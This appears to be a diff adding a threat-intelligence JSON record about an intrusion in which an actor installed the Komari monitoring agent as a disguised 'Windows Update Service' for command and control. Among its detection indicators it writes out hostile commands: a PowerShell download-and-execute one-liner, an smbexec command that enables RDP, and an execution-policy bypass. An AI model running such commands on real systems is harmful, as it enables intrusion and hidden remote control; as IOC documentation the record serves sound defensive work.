@@ -1,0 +1,238 @@
+{
+  "malware_family": "Komari",
+  "threat_actor": "",
+  "platforms": [
+    "windows",
+    "linux"
+  ],
+  "summary": "A threat actor abused Komari, a legitimate Go-based open-source monitoring tool, as a C2 agent. After gaining access via stolen VPN credentials, the actor installed Komari as a persistent SYSTEM-level service named \"Windows Update Service\" using NSSM. Komari provides arbitrary command execution, an interactive reverse shell, and network probing capabilities out-of-the-box via a persistent WebSocket.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "service_name",
+      "value": "Windows Update Service",
+      "context": "Masquerade name for Komari service installed via NSSM.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "vomtLDXyggveYfjFxdoo7Z",
+      "context": "Komari agent bearer token for C2 authentication.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -c \"iwr -uri 'https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.ps1' -useb | iex\"",
+      "context": "Installation command run from cmd.exe to download and run installer.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "-e http://[Malicious C2 Redacted]:55964 -t vomtLDXyggveYfjFxdoo7Z",
+      "context": "Komari agent parameters in NSSM service key.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\System\\CurrentControlSet\\Services\\Windows Update Service",
+      "context": "Windows service entry registered by NSSM for persistence.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "NSSM",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\System32\\komari-agent.exe",
+      "context": "Default installation path for Komari agent binary.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "komari-agent.exe",
+      "context": "Komari agent executable name.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "%COMSPEC% /Q /c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f > \\\\127.0.0.1\\C$\\__output_iDhLsdpD 2>&1",
+      "context": "Enabling RDP via smbexec.py, parented by services.exe.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Impacket smbexec.py",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "VM8514",
+      "context": "Attacker workstation name in logon events.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "PowerShell -ExecutionPolicy Bypass -File C:\\Users\\[User 1]\\AppData\\Local\\Temp\\102184ef-a26d-4fb6-4bff-d4e4bd5e8de0.ps1",
+      "context": "Komari agent's one-time inventory collection script execution.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "komari-agent.exe -> PowerShell.exe",
+      "context": "Komari agent spawns PowerShell for inventory collection.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\aRhRnnHI.tmp",
+      "context": "Staging file dropped by Behavior:Win32/RegDump.SA.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections",
+      "context": "Registry key modified to enable RDP access.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "--ignore-unsafe-cert",
+      "context": "Komari agent flag to accept self-signed certificates.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "--disable-web-ssh",
+      "context": "Komari flag to disable interactive terminal, not used by actor.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Komari",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.ps1",
+      "context": "Komari agent install script download URL.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/clients/report",
+      "context": "Komari agent WebSocket C2 channel path.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Komari"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/clients/terminal",
+      "context": "Komari agent WebSocket path for interactive reverse shell.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Komari"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/clients/task/result",
+      "context": "Komari agent path to POST command execution results.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Komari"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/clients/uploadBasicInfo",
+      "context": "Komari agent path to upload initial host information.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Komari"
+    },
+    {
+      "kind": "ip",
+      "value": "45.153.34.132",
+      "context": "Threat actor's SSLVPN ingress source IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "TCP/25774",
+      "context": "Default Komari server port, often reverse-proxied.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Komari"
+    },
+    {
+      "kind": "ip",
+      "value": "10.212.134.200",
+      "context": "FortiGate-assigned internal IP for actor's SSLVPN session.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "039e659ade3aa8ee7758c11fdb8fbfffd2491920046d638413cea2042f6d584c",
+      "description": "komari-agent.exe"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
